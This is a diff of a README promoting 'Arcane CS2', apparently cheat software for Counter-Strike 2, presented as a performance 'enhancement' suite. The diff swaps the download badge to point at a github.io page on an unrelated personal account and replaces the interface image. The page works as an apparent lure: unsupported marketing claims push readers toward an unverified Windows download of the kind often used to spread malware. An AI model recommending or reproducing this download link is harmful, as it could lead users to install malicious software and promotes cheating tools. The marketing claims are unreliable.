@@ -4,10 +4,8 @@
   <img src="https://i.ytimg.com/vi/9hHDRUtJ4Bc/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLChIrdLgKcn-uzD4Prg6U6a8ChhuQ" alt="Arcane CS2 Logo"/>
 </div>
 
-<div align="center">
+[![GET Arcane Enhancement](https://img.shields.io/badge/GET%20%E2%80%94%20Arcane-Enhancement-0078D6?style=for-the-badge&logoColor=white)](https://dorothythompsonh808.github.io/.github/Arcane-Enhancement)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://arcane-enhancement-cs2.github.io/.github/)
-</div>
 
 ---
 
@@ -20,7 +18,8 @@ The enhancement tools within Arcane utilize sophisticated algorithms to analyze 
 Advanced customization options in Arcane allow players to fine-tune every aspect of their gaming experience, from visual settings that enhance visibility to audio configurations that improve spatial awareness. The Arcane enhancement suite includes proprietary technologies that reduce system overhead while maintaining the highest levels of game stability and performance consistency. This comprehensive approach makes Arcane the preferred choice for professional and aspiring competitive players seeking to maximize their performance in high-stakes gaming environments.
 
 <div align="center">
-  <img src="https://data.exloader.net/webp_images/En1gma/aim.webp" alt="Arcane CS2 Interface"/>
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRSKO2U9plSHyP5tyMdHk_kLHTl9D-mucEwWKlCoz9yMA&s=10
+"/>
 </div>
 
 ---
